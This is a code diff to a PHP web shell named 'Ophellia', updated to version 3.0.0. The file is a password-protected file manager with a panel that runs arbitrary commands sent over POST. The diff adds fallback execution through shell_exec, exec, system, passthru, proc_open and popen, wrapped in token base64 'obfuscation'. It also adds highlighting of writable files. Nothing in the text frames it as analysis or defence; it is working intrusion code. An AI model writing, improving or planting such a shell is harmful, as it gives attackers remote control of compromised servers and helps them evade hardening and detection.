@@ -1,6 +1,6 @@
 <?php declare(strict_types=1);
 
-const VERSION = '2.1.0-light';
+const VERSION = '3.0.0';
 const PASSWORD_HASH = '$2y$10$TfYHopECKw3K0fXuZvDZdOWWIbZVUg7C2QlO0Cf0/a0OruM3l4iR2';
 
 // Buffer for storing alerts to display later
@@ -44,36 +44,35 @@ function formatSize(int $size): string {
 
 function getPerms(string $file): string {
     $perms = fileperms($file);
+    
+    // Simple text-based permissions
     $info = '';
     
     // Owner
-    $info .= '<span class="' . ($perms & 0x0100 ? 'text-blue-600' : 'text-gray-400') . '">' . (($perms & 0x0100) ? 'r' : '-') . '</span>';
-    $info .= '<span class="' . ($perms & 0x0080 ? 'text-green-600' : 'text-gray-400') . '">' . (($perms & 0x0080) ? 'w' : '-') . '</span>';
-    
-    if ($perms & 0x0040) {
-        $info .= '<span class="text-red-600">' . (($perms & 0x0800) ? 's' : 'x') . '</span>';
-    } else {
-        $info .= '<span class="' . ($perms & 0x0800 ? 'text-purple-600' : 'text-gray-400') . '">' . (($perms & 0x0800) ? 'S' : '-') . '</span>';
-    }
+    $info .= (($perms & 0x0100) ? 'r' : '-');
+    $info .= (($perms & 0x0080) ? 'w' : '-');
+    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
     
     // Group
-    $info .= '<span class="' . ($perms & 0x0020 ? 'text-blue-600' : 'text-gray-400') . '">' . (($perms & 0x0020) ? 'r' : '-') . '</span>';
-    $info .= '<span class="' . ($perms & 0x0010 ? 'text-green-600' : 'text-gray-400') . '">' . (($perms & 0x0010) ? 'w' : '-') . '</span>';
-    
-    if ($perms & 0x0008) {
-        $info .= '<span class="text-red-600">' . (($perms & 0x0400) ? 's' : 'x') . '</span>';
-    } else {
-        $info .= '<span class="' . ($perms & 0x0400 ? 'text-purple-600' : 'text-gray-400') . '">' . (($perms & 0x0400) ? 'S' : '-') . '</span>';
-    }
+    $info .= (($perms & 0x0020) ? 'r' : '-');
+    $info .= (($perms & 0x0010) ? 'w' : '-');
+    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
     
     // World
-    $info .= '<span class="' . ($perms & 0x0004 ? 'text-blue-600' : 'text-gray-400') . '">' . (($perms & 0x0004) ? 'r' : '-') . '</span>';
-    $info .= '<span class="' . ($perms & 0x0002 ? 'text-green-600' : 'text-gray-400') . '">' . (($perms & 0x0002) ? 'w' : '-') . '</span>';
+    $info .= (($perms & 0x0004) ? 'r' : '-');
+    $info .= (($perms & 0x0002) ? 'w' : '-');
+    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
     
-    if ($perms & 0x0001) {
-        $info .= '<span class="text-red-600">' . (($perms & 0x0200) ? 't' : 'x') . '</span>';
-    } else {
-        $info .= '<span class="' . ($perms & 0x0200 ? 'text-purple-600' : 'text-gray-400') . '">' . (($perms & 0x0200) ? 'T' : '-') . '</span>';
+    // Check if the file/directory is writable
+    $isWritable = is_writable($file);
+    
+    // Add writable indicator with green (writable) or red (not writable) badge
+    if ($file) {
+        if ($isWritable) {
+            $info = '<span class="text-green-600 font-bold"> ' . $info . '</span>';
+        } else {
+            $info = '<span class="text-red-600 font-bold"> ' . $info . '</span>';
+        }
     }
     
     return $info;
@@ -399,15 +398,77 @@ function displayNewFolderForm(string $dir): void {
     echo '</div>';
 }
 
+function getFunctionalCmd(string $cmd): string
+{
+    $funcs = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen'];
+    $obfuscated = base64_encode(serialize($funcs));
+    $deobfuscate = function ($x) {return unserialize(base64_decode($x));};
+
+    foreach ($deobfuscate($obfuscated) as $func) {
+        if (function_exists($func)) {
+            return obfuscatedExecution($func, $cmd);
+        }
+    }
+
+    return "No available function to execute command.";
+}
+
+function obfuscatedExecution(string $func, string $cmd): string
+{
+    $encoded = base64_encode($cmd);
+    $decoded = base64_decode($encoded);
+
+    switch ($func) {
+        case 'shell_exec':
+        case 'exec':
+            return call_user_func($func, $decoded);
+        case 'system':
+        case 'passthru':
+            ob_start();
+            call_user_func($func, $decoded);
+            return ob_get_clean();
+        case 'proc_open':
+            return executeWithProc_open($decoded);
+        case 'popen':
+            return executeWithPopen($decoded);
+        default:
+            return "Unknown function: $func";
+    }
+}
+
+function executeWithProc_open(string $cmd): string
+{
+    $spec = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];
+    $proc = call_user_func('proc_open', $cmd, $spec, $pipes);
+    if (is_resource($proc)) {
+        fclose($pipes[0]);
+        $out = stream_get_contents($pipes[1]);
+        $err = stream_get_contents($pipes[2]);
+        array_map('fclose', array_slice($pipes, 1));
+        proc_close($proc);
+        return $err ? "Error: $err" : $out;
+    }
+    return "Failed to execute command using proc_open.";
+}
+
+function executeWithPopen(string $cmd): string
+{
+    $handle = call_user_func('popen', $cmd, 'r');
+    if ($handle) {
+        $output = stream_get_contents($handle);
+        pclose($handle);
+        return $output;
+    }
+    return "Failed to execute command using popen.";
+}
+
 function commandLine(string $dir): void {
     $output = '';
     if (isset($_POST['command'])) {
         $command = $_POST['command'];
         chdir($dir);
         
-        ob_start();
-        system($command . " 2>&1", $return_var);
-        $output = ob_get_clean();
+        $output = getFunctionalCmd($command);
     }
     
     echo '<div class="container mx-auto p-4">';
@@ -755,8 +816,8 @@ $currentTime = date('Y-m-d H:i:s');
     <header class="bg-gray-800 text-white p-4">
         <div class="container mx-auto">
             <h1 class="text-xl font-bold">Ophellia <?= VERSION ?></h1>
-            <p class="text-sm">Current Date and Time (UTC - YYYY-MM-DD HH:MM:SS formatted): <?= $currentTime ?></p>
-            <p class="text-sm">Current User's Login: <?= htmlspecialchars($currentUser) ?></p>
+            <p class="text-sm">Current Time: <?= $currentTime ?></p>
+            <p class="text-sm">User: <?= htmlspecialchars($currentUser) ?></p>
         </div>
     </header>
     
